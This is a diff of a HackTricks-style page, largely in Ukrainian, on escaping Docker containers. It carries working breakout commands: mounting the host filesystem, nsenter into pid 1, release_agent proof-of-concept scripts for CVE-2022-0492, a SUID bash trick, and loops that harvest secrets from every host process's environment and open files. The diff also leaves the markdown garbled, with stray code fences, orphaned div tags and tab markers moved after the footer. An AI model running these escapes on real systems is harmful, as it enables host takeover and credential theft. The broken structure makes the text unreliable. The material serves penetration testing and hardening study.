@@ -1,4 +1,4 @@
-# Втеча з Docker / Підвищення привілеїв
+# Docker Breakout / Privilege Escalation
 
 <details>
 
@@ -34,12 +34,15 @@
 
 Якщо ви якимось чином виявите, що **сокет Docker підключений** всередині контейнера Docker, ви зможете втекти з нього.\
 Це зазвичай трапляється в контейнерах Docker, які з якоїсь причини потребують підключення до демона Docker для виконання дій.
+
 ```bash
 #Search the socket
 find / -name docker.sock 2>/dev/null
 #It's usually in /run/docker.sock
 ```
+
 У цьому випадку ви можете використовувати звичайні команди docker для взаємодії з демоном docker:
+
 ```bash
 #List images to use one
 docker images
@@ -53,6 +56,7 @@ nsenter --target 1 --mount --uts --ipc --net --pid -- bash
 # Get full privs in container without --privileged
 docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --security-opt seccomp=unconfined --security-opt label:disable --pid=host --userns=host --uts=host --cgroupns=host ubuntu chroot /host/ bash
 ```
+
 {% hint style="info" %}
 У випадку, якщо **сокет docker знаходиться в неочікуваному місці**, ви все ще можете спілкуватися з ним, використовуючи команду **`docker`** з параметром **`-H unix:///path/to/docker.sock`**
 {% endhint %}
@@ -75,9 +79,11 @@ docker run -it -v /:/host/ --cap-add=ALL --security-opt apparmor=unconfined --se
 Вам слід перевірити можливості контейнера, якщо він має будь-які з наступних, ви, можливо, зможете втекти з нього: **`CAP_SYS_ADMIN`**_,_ **`CAP_SYS_PTRACE`**, **`CAP_SYS_MODULE`**, **`DAC_READ_SEARCH`**, **`DAC_OVERRIDE, CAP_SYS_RAWIO`, `CAP_SYSLOG`, `CAP_NET_RAW`, `CAP_NET_ADMIN`**
 
 Ви можете перевірити поточні можливості контейнера, використовуючи **зазначені раніше автоматичні інструменти** або:
+
 ```bash
 capsh --print
 ```
+
 На наступній сторінці ви можете **дізнатися більше про можливості Linux** та як їх зловживати для втечі/підвищення привілеїв:
 
 {% content-ref url="../../linux-capabilities.md" %}
@@ -109,17 +115,21 @@ capsh --print
 З цими дозволами ви можете просто **перейти до простору імен процесу, що працює на хості як root**, наприклад init (pid:1), просто виконавши: `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`
 
 Перевірте це в контейнері, виконавши:
+
 ```bash
 docker run --rm -it --pid=host --privileged ubuntu bash
 ```
+
 ### Привілейований
 
 Лише з прапорцем privileged ви можете спробувати **отримати доступ до диска хоста** або спробувати **втекти, зловживаючи release\_agent або інші втечі**.
 
 Перевірте наступні обхідні шляхи в контейнері, виконавши:
+
 ```bash
 docker run --rm -it --privileged ubuntu bash
 ```
+
 #### Підключення диска - Poc1
 
 Налаштовані належним чином контейнери Docker не дозволять виконати команду, таку як **fdisk -l**. Однак на неправильно налаштованій команді Docker, де вказано прапорці `--privileged` або `--device=/dev/sda1` з правами, можливо отримати привілеї для перегляду диска хоста.
@@ -127,15 +137,18 @@ docker run --rm -it --privileged ubuntu bash
 ![](https://bestestredteam.com/content/images/2019/08/image-16.png)
 
 Таким чином, для захоплення хост-машини це тривіально:
+
 ```bash
 mkdir -p /mnt/hola
 mount /dev/sda1 /mnt/hola
 ```
+
 І ось! Тепер ви можете отримати доступ до файлової системи хоста, оскільки вона змонтована в папці `/mnt/hola`.
 
 #### Монтування диска - Poc2
 
 У межах контейнера зловмисник може спробувати отримати додатковий доступ до основної операційної системи хоста за допомогою записного тома hostPath, створеного кластером. Нижче наведено деякі загальні речі, які ви можете перевірити у межах контейнера, щоб побачити, чи використовуєте ви цей вектор атаки:
+
 ```bash
 ### Check if You Can Write to a File-system
 echo 1 > /proc/sysrq-trigger
@@ -156,6 +169,7 @@ mount: /mnt: permission denied. ---> Failed! but if not, you may have access to 
 ### debugfs (Interactive File System Debugger)
 debugfs /dev/sda1
 ```
+
 #### Привілейований вихід за допомогою існуючого release\_agent ([cve-2022-0492](https://unit42.paloaltonetworks.com/cve-2022-0492-cgroups/)) - PoC1
 
 {% code title="Початковий PoC" %}
@@ -253,6 +267,7 @@ cat /output
 {% content-ref url="release_agent-exploit-relative-paths-to-pids.md" %}
 [release\_agent-exploit-relative-paths-to-pids.md](release\_agent-exploit-relative-paths-to-pids.md)
 {% endcontent-ref %}
+
 ```bash
 #!/bin/sh
 
@@ -312,7 +327,9 @@ sleep 1
 echo "Done! Output:"
 cat ${OUTPUT_PATH}
 ```
+
 Виконання PoC у привілейованому контейнері повинно надати вивід, схожий на:
+
 ```bash
 root@container:~$ ./release_agent_pid_brute.sh
 Checking pid 100
@@ -340,6 +357,7 @@ root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
 root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
 ...
 ```
+
 #### Привілейоване уникнення за допомогою чутливих монтажів
 
 Існує кілька файлів, які можуть бути змонтовані та надавати **інформацію про базовий хост**. Деякі з них можуть навіть вказувати на **щось, що повинно виконуватися хостом при виникненні певної події** (що дозволить зловмиснику вийти з контейнера).\
@@ -360,13 +378,16 @@ root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
 ### Довільні монтажі
 
 У декількох випадках ви можете виявити, що **контейнер має деякий обсяг, змонтований з хоста**. Якщо цей обсяг не був належним чином налаштований, ви можете мати можливість **отримати/змінити чутливі дані**: читати секрети, змінювати ssh authorized\_keys...
+
 ```bash
 docker run --rm -it -v /:/host ubuntu bash
 ```
+
 ### Підвищення привілеїв за допомогою 2 оболонок та монтування хоста
 
 Якщо у вас є доступ як **root всередині контейнера**, в якому монтується деяка папка з хоста, і ви **вийшли як не привілейований користувач на хост**, і маєте доступ на читання до змонтованої папки.\
 Ви можете створити **bash suid файл** в **змонтованій папці** всередині **контейнера** і **виконати його з хоста** для підвищення привілеїв.
+
 ```bash
 cp /bin/bash . #From non priv inside mounted folder
 # You need to copy it from the host as the bash binaries might be diferent in the host and in the container
@@ -374,6 +395,7 @@ chown root:root bash #From container as root inside mounted folder
 chmod 4777 bash #From container as root inside mounted folder
 bash -p #From non priv inside mounted folder
 ```
+
 ### Підвищення привілеїв за допомогою 2 оболонок
 
 Якщо у вас є доступ як **root всередині контейнера** і ви **вибралися як не привілейований користувач на хості**, ви можете зловживати обома оболонками для **підвищення привілеїв всередині хоста**, якщо у вас є можливість MKNOD всередині контейнера (це за замовчуванням), як пояснено в цьому [**пості**](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/).\
@@ -382,6 +404,7 @@ bash -p #From non priv inside mounted folder
 Docker захищає від зловживання блочними пристроями всередині контейнерів, застосовуючи політику cgroup, яка **блокує операції читання/запису блочних пристроїв**. Однак, якщо блочний пристрій **створений всередині контейнера**, він стає доступним ззовні контейнера через каталог **/proc/PID/root/**. Для цього доступу потрібно, щоб **власник процесу був однаковим** як всередині, так і ззовні контейнера.
 
 Приклад **експлуатації** з цього [**опису**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
+
 ```bash
 # On the container as root
 cd /
@@ -417,15 +440,19 @@ augustus  1661  0.0  0.0   6116   648 pts/0    S+   09:48   0:00              \_
 augustus@GoodGames:~$ grep -a 'HTB{' /proc/1659/root/sda
 HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
 ```
+
 ### hostPID
 
 Якщо ви можете отримати доступ до процесів хоста, ви зможете отримати доступ до багато чутливої інформації, збереженої в цих процесах. Запустіть тестову лабораторію:
+
 ```
 docker run --rm -it --pid=host ubuntu bash
 ```
+
 Наприклад, ви зможете переглянути список процесів за допомогою чогось на зразок `ps auxn` та шукати чутливі дані в командах.
 
 Потім, оскільки ви можете **отримати доступ до кожного процесу хоста в /proc/, ви можете просто вкрасти їхні секрети env**, запустивши:
+
 ```bash
 for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
 /proc/988058/environ
@@ -434,7 +461,9 @@ HOSTNAME=argocd-server-69678b4f65-6mmql
 USER=abrgocd
 ...
 ```
+
 Ви також можете **отримати доступ до файлових дескрипторів інших процесів та прочитати їх відкриті файли**:
+
 ```bash
 for fd in `find /proc/*/fd`; do ls -al $fd/* 2>/dev/null | grep \>; done > fds.txt
 less fds.txt
@@ -444,6 +473,7 @@ lrwx------ 1 root root 64 Jun 15 02:25 /proc/635813/fd/4 -> /.secret.txt.swp
 # You can open the secret filw with:
 cat /proc/635813/fd/4
 ```
+
 Ви також можете **завершувати процеси та спричиняти DoS**.
 
 {% hint style="warning" %}
@@ -451,9 +481,11 @@ cat /proc/635813/fd/4
 {% endhint %}
 
 ### hostNetwork
+
 ```
 docker run --rm -it --network=host ubuntu bash
 ```
+
 Якщо контейнер був налаштований з допомогою драйвера мережі Docker [host (`--network=host`)](https://docs.docker.com/network/host/), стек мережі цього контейнера не ізольований від хоста Docker (контейнер ділиться простором імен мережі хоста), і контейнер не отримує власну IP-адресу. Іншими словами, **контейнер прив'язує всі служби безпосередньо до IP-адреси хоста**. Крім того, контейнер може **перехоплювати ВСІ мережовий трафік, який хост** відправляє та отримує на спільному інтерфейсі `tcpdump -i eth0`.
 
 Наприклад, це можна використовувати для **перехоплення та навіть підробки трафіку** між хостом та екземпляром метаданих.
@@ -466,9 +498,11 @@ docker run --rm -it --network=host ubuntu bash
 Ви також зможете отримати доступ до **мережевих служб, прив'язаних до localhost** всередині хоста або навіть отримати доступ до **дозволів метаданих вузла** (які можуть відрізнятися від тих, які може отримати контейнер).
 
 ### hostIPC
+
 ```bash
 docker run --rm -it --ipc=host ubuntu bash
 ```
+
 З `hostIPC=true` ви отримуєте доступ до ресурсів міжпроцесної комунікації (IPC) хоста, таких як **спільна пам'ять** в `/dev/shm`. Це дозволяє читати/писати там, де ті самі ресурси IPC використовуються іншими процесами хоста або підпроцесами. Використовуйте `ipcs`, щоб докладніше дослідити ці механізми IPC.
 
 * **Огляд /dev/shm** - Шукайте файли в цьому місці спільної пам'яті: `ls -la /dev/shm`
@@ -477,11 +511,13 @@ docker run --rm -it --ipc=host ubuntu bash
 ### Відновлення можливостей
 
 Якщо системний виклик **`unshare`** не заборонено, ви можете відновити всі можливості, запустивши:
+
 ```bash
 unshare -UrmCpf bash
 # Check them with
 cat /proc/self/status | grep CapEff
 ```
+
 ### Зловживання простором користувача через символічні посилання
 
 Друга техніка, пояснена в пості [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/), показує, як ви можете зловживати прив'язками монтування з просторами користувачів, щоб впливати на файли всередині хоста (у цьому конкретному випадку - видаляти файли).
@@ -565,12 +601,12 @@ cat /proc/self/status | grep CapEff
 ```
 {% endtab %}
 
-{% tab title="syscall_bf.c" %} 
-## Втеча з Docker контейнера
+{% tab title="syscall_bf.c" %}
+### Втеча з Docker контейнера
 
 Цей код використовує низькорівневі системні виклики для втечі з Docker контейнера та отримання привілеїв користувача на хост-системі.
 
-```c
+`````c
 #include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
@@ -659,11 +695,13 @@ else
 printf("OK\n");
 }
 }
+`````
+
 ```
 
-````
-{% endtab %}
-{% endtabs %}
+</div>
+
+</div>
 
 ### Container Breakout through Usermode helper Template
 
@@ -692,7 +730,7 @@ If you are in **userspace** (**no kernel exploit** involved) the way to find new
 Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
 Get Access Today:
 
-{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
+<div data-gb-custom-block data-tag="embed" data-url='https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks'></div>
 
 <details>
 
@@ -707,3 +745,6 @@ Other ways to support HackTricks:
 * **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+```
+{% endtab %}
+{% endtabs %}
